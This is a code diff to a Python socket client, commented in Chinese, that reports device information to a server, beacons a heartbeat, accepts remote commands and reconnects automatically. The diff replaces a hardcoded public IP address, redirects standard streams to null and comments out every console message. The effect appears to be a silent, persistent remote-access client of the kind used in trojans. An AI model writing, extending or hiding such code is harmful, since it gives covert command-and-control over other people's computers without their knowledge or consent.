@@ -7,10 +7,16 @@ import platform
 import subprocess
 import time
 import os
-
+import sys
+if sys.stdin is None:
+    sys.stdin = open(os.devnull, 'r')
+if sys.stdout is None:
+    sys.stdout = open(os.devnull, 'w')
+if sys.stderr is None:
+    sys.stderr = open(os.devnull, 'w')
 
 class Client:
-    def __init__(self, server_host='154.64.244.229', server_port=9999):
+    def __init__(self, server_host='localhost', server_port=9999):
         self.server_host = server_host
         self.server_port = server_port
         self.client_socket = None
@@ -37,10 +43,10 @@ class Client:
                 'system': self.system_info
             }
             self.send_message(client_info)  # 发送设备信息到server端）
-            print(f"已连接到服务器 {self.server_host}:{self.server_port}")
+            #print(f"已连接到服务器 {self.server_host}:{self.server_port}")
             return True
         except Exception as e:
-            print(f"连接服务器失败: {e}")
+            #print(f"连接服务器失败: {e}")
             return False
 
     def send_message(self, message):
@@ -50,7 +56,7 @@ class Client:
                 self.client_socket.sendall(message_str.encode("utf-8"))
             return True
         except Exception as e:
-            print(f"发送消息失败: {e}")
+            #print(f"发送消息失败: {e}")
             return False
 
     def heartbeat_loop(self, interval=5):
@@ -68,7 +74,7 @@ class Client:
             try:
                 data = self.client_socket.recv(4096)
                 if not data:
-                    print("服务器连接已断开")
+                    #print("服务器连接已断开")
                     break
                 buffer += data
 
@@ -87,7 +93,7 @@ class Client:
                         self.send_message(response)
 
             except Exception as e:
-                print(f"接收命令时出错: {e}")
+                #print(f"接收命令时出错: {e}")
                 break
 
     def handle_message(self, command):
@@ -215,7 +221,7 @@ class Client:
                     pass
                 self.client_socket = None
 
-                print("连接丢失，5秒后尝试重连...")
+                #print("连接丢失，5秒后尝试重连...")
             time.sleep(5)
 
     def stop(self):
@@ -232,5 +238,5 @@ if __name__ == "__main__":
     try:
         client.start()
     except KeyboardInterrupt:
-        print("\n正在关闭客户端...")
+        #print("\n正在关闭客户端...")
         client.stop()
